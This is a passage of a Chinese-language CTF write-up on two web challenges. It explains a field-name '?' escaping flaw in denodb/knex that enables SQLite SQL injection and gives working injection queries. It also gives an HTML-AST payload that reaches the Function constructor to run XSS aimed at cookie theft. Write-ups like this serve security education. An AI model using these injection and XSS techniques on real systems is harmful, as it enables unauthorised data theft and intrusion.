<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">apiRouter<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/food/:id"</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token parameter">ctx</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> id <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">getQuery</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">mergeParams</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> Food<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'name'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">where</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        ctx<span class="token punctuation">.</span>response<span class="token punctuation">.</span>body <span class="token operator">=</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        ctx<span class="token punctuation">.</span>response<span class="token punctuation">.</span>body <span class="token operator">=</span> e<span class="token punctuation">.</span>name
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>id</code> 會是個 object，你有完全的掌控權，但是不支援 array 跟 nested object，只能傳單純的物件進去。</p>
<p>目標是 SQL injection。</p>
<p>這題是我看最久而且最認真的一題，直接開 Chrome debugger 進去 trace code，底下簡單講一下內部的運作。</p>
<p>首先會把你傳進去的 object 轉成底下這樣的形式：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">wheres</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span><span class="token literal-property property">field</span><span class="token operator">:</span> <span class="token string">"any"</span><span class="token punctuation">,</span> <span class="token literal-property property">opeator</span><span class="token operator">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span><span class="token literal-property property">field</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token literal-property property">opeator</span><span class="token operator">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"hello"</span><span class="token punctuation">&#125;</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然後丟給 <a target="_blank" rel="noopener" href="https://github.com/eveningkid/denodb/blob/v1.0.40/lib/connectors/sqlite3-connector.ts#L55">this._translator.translateToQuery</a> 去產生出弄好的 SQL query，接著用神秘的字串分割去切，看有沒有 sub query，然後丟到 SQLite 裡面，部分程式碼如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">query</span><span class="token punctuation">(</span>queryDescription<span class="token operator">:</span> QueryDescription<span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>any <span class="token operator">|</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_makeConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> query <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_translator<span class="token punctuation">.</span><span class="token function">translateToQuery</span><span class="token punctuation">(</span>queryDescription<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> subqueries <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">;(?=(?:[^'"]|'[^']*'|"[^"]*")*$)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> results <span class="token operator">=</span> subqueries<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">subquery<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> preparedQuery <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_client<span class="token punctuation">.</span><span class="token function">prepareQuery</span><span class="token punctuation">(</span>subquery <span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>切字串的地方之前有出過事，改了之後也還是會出事，但在這題好像無關緊要：<a target="_blank" rel="noopener" href="https://github.com/eveningkid/denodb/pull/241">https://github.com/eveningkid/denodb/pull/241</a></p>
<p>這邊產生出來的 query 已經是完整的 SQL query 了，也就是說參數綁定這件事情並不是丟到 SQLite 去做，而是直接用 JS。</p>
<p>那這個完整的 SQL query 到底是怎麼出來的呢？</p>
<p>首先，你的東西會被丟進 query builder 去，執行像這樣的東西：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">queryBuilder <span class="token operator">=</span> queryBuilder<span class="token punctuation">.</span><span class="token function">where</span><span class="token punctuation">(</span>
  where<span class="token punctuation">.</span>field<span class="token punctuation">,</span>
  where<span class="token punctuation">.</span>operator<span class="token punctuation">,</span>
  where<span class="token punctuation">.</span>value<span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 回傳 queryBuilder.toString</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而那個 <code>queryBuilder.where</code> 裡面，基本上就是根據你傳進來的東西去做事，例如說如果我傳：<code>&#123;field:&quot;id&quot;, operator:&quot;=&quot;, value:&quot;hello&quot;&#125;</code>，最後就會執行到：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>_statements<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">grouping</span><span class="token operator">:</span> <span class="token string">'where'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'whereBasic'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">column</span><span class="token operator">:</span> <span class="token string">"id"</span><span class="token punctuation">,</span>
    <span class="token literal-property property">operator</span><span class="token operator">:</span> <span class="token string">"="</span><span class="token punctuation">,</span>
    <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span>
    <span class="token literal-property property">not</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_not</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">bool</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_bool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">asColumn</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以最後轉換成字串，就是根據這個 <code>this._statements</code> 去弄。</p>
<p>首先它會先根據你這些 where 組出語句來，怎麼個組法呢？就是把 column 用 backtick 包起來，然後把值變成 <code>?</code>，像這樣：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>food<span class="token punctuation">`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span>? <span class="token operator">and</span> <span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span><span class="token operator">=</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>這個所謂的「包起來」，程式碼在：<a target="_blank" rel="noopener" href="https://github.com/aghussb/dex/blob/1.0.2/lib/formatter.js#L274">https://github.com/aghussb/dex/blob/1.0.2/lib/formatter.js#L274</a></p>
<p>產生完 SQL query 以後，開始做 data binding，程式碼大概是這樣：<a target="_blank" rel="noopener" href="https://github.com/knex/knex/blob/2.3.0/lib/execution/internal/query-executioner.js#L6">https://github.com/knex/knex/blob/2.3.0/lib/execution/internal/query-executioner.js#L6</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">formatQuery</span><span class="token punctuation">(</span><span class="token parameter">sql<span class="token punctuation">,</span> bindings<span class="token punctuation">,</span> timeZone<span class="token punctuation">,</span> client</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  bindings <span class="token operator">=</span> bindings <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>bindings<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\?\?</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>match <span class="token operator">===</span> <span class="token string">'\\?'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">'?'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">===</span> bindings<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> match<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">const</span> value <span class="token operator">=</span> bindings<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> client<span class="token punctuation">.</span><span class="token function">_escapeBinding</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> timeZone <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>把 <code>?</code> 取代成字串，然後取代之前會先 escape，escape 的內容就是外面加單引號，然後把字串本身的單引號變成兩個單引號。</p>
<p>看起來沒什麼問題，但是 deno 的 lib 忘記對欄位名稱的 <code>?</code> 做 escape 了，所以如果你傳：<code>&#123;&quot;id&quot;:&quot;1&quot;, &quot;?&quot;: &quot;A&quot;&#125;</code>，最後出來的 SQL 會是：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>food<span class="token punctuation">`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span>? <span class="token operator">and</span> <span class="token identifier"><span class="token punctuation">`</span>?<span class="token punctuation">`</span></span><span class="token operator">=</span>? <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>而 bind 完之後就會變成：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>food<span class="token punctuation">`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token identifier"><span class="token punctuation">`</span>'A'<span class="token punctuation">`</span></span><span class="token operator">=</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>你會發現 A 那邊可以做 SQL injection，只要先閉合那個反引號就行了。</p>
<p>但問題是這樣會產生不合法的欄位名稱，因為裡面一定有個單引號，像這樣：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>food<span class="token punctuation">`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token identifier"><span class="token punctuation">`</span>'name<span class="token punctuation">`</span></span><span class="token comment">--'=?</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>會出現：</p>
<blockquote>
<p>Error: no such column: ‘name</p>
</blockquote>
<p>當初做到這邊就卡住了，大概就兩條路：</p>
<ol>
<li>有其他的漏洞沒注意到</li>
<li>有神奇的 SQLite 語法可以繞過不存在的欄位名稱</li>
</ol>
<p>答案是後者。</p>
<p>底下這兩種都不會出錯：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id <span class="token keyword">from</span> food <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>not_exist'<span class="token punctuation">`</span></span> <span class="token operator">and</span> <span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> food <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">`</span>not_exist'<span class="token punctuation">`</span></span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>不要問我為什麼，我也不知道，感覺是某種語法上的 bug（或 feature XD）</p>
<p>弄出 SQL injection 以後就弄個 time-based 的 query，然後用 xsleak 去測時間即可。或也可以像 terjanq 弄成 error-based 的，效率會再高一點。</p>
<p>其他人的 writeup:</p>
<ol>
<li>parrot <a target="_blank" rel="noopener" href="https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98">https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98</a></li>
<li>terjanq <a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436">https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436</a></li>
<li>kunte_ <a target="_blank" rel="noopener" href="https://files.veryhax.ninja/solve-foodapi-hacklu22.html">https://files.veryhax.ninja/solve-foodapi-hacklu22.html</a></li>
</ol>
<h2><span id="htpl3-solves">HTPL(3 solves)</span></h2><p>這題是一個自製的 AST，用 HTML 的方式來組合出 JS，例如說：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>就會被翻譯成 <code>&quot;hello&quot;</code>。</p>
<p>目標是偷到 cookie，所以要能夠執行 XSS。這題看很久但沒什麼想法，我有想過是不是透過一些數學運算可以跳脫字串之類的，但沒找到 <code>\</code>，想用註解也沒看到 <code>*</code> 可以用。</p>
<p>賽後發現想法近了，但忘記 HTML 的註解 <code>&lt;!--</code> 也可以用。用小於 + not + 減法就可以湊出註解的符號，像這樣：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-program</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-program</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>就會翻譯成：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">"a"</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$1$<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最後的分號會被弄掉，於是可以結合下一行的 <code>[]</code> 變成存取屬性，像這樣：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-program</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
            
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>asd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>        
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-array</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>toString<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-array</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-program</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>會翻譯成：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">write</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">alert</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">prompt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> $a$<span class="token operator">=</span><span class="token string">"x"</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$asd$<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token string">"toString"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>也就是 <code>const $a$=&quot;x&quot;[&quot;toString&quot;]</code></p>
<p>做到這邊好就簡單了，再繼續串下去拿到 function constructor 之後再呼叫即可，像這樣：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-program</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
            
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>asd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>        
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-array</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>toString<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-array</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>b<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>asd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>        
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-array</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>constructor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-array</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-call</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>b<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>alert("xss")<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-call</span><span class="token punctuation">></span></span>      
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-call</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-call</span><span class="token punctuation">></span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-program</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

